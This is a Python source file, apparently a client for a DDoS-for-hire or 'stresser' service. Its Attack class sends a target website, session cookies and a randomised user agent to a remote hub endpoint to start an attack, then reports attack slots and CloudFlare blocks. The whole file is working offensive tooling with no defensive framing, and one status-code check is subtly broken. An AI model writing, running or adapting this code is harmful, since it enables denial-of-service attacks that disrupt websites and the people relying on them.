import json
import httpx
import sys, os

from colorama import *
from helpers.data import get
from helpers.useragent import UserAgent

init(convert=True)
httpx_client: object = httpx.Client(timeout=None) 

class Attack:        
    async def start(self, website: str, method: str) -> bool:
        try:
            if method.lower() != "https" and method.lower() != "http":
                return False
            else:
                website: str = website.replace("https://", "").replace("http://", "")
                new_url: str = f"{method}://{website}"
                
                user_agent: str = UserAgent.random()
                
                if user_agent == None:
                    print(f"{Fore.RED}[USERAGENT]{Fore.RED}{Fore.RESET} Failed to generate a unique UserAgent")
                else:
                    print(f"{Fore.GREEN}[USERAGENT]{Fore.GREEN}{Fore.RESET} {user_agent}")
                
                response = httpx_client.post(f"{self.base_url}/request/hub/start", headers=get.attack_headers(self.cookie, user_agent), data=get.attack_payload(new_url))

                if response.status_code == 200:
                    response_content: str = response.content.decode("utf-8")
                    response_content: dict = json.loads(response_content)
                                        
                    if response_content["status"] == False:
                        if response_content["message"] == "You have exceeded your total slots in running.":
                            print(f"{Fore.RED}[ATTACK]{Fore.RED}{Fore.RESET} Please only run 1 attack at a time")
                        else:
                            print(f"{Fore.RED}[ATTACK]{Fore.RED}{Fore.RESET} {response_content['message']}")
                    elif response_content["status"] == True:
                        print(f"{Fore.GREEN}[ATTACK]{Fore.GREEN}{Fore.RESET} Attack has started on {new_url}")
                    else:
                        return False
                    
                else:
                    if response.status_code == "403":
                        print(f"{Fore.RED}[CLOUDFLARE]{Fore.RED}{Fore.RESET} CloudFlare has blocked our request")
                    return False
            
        except Exception as e:
            print(f"{Fore.RED}[ERROR]{Fore.RED}{Fore.RESET} {e}")
            return False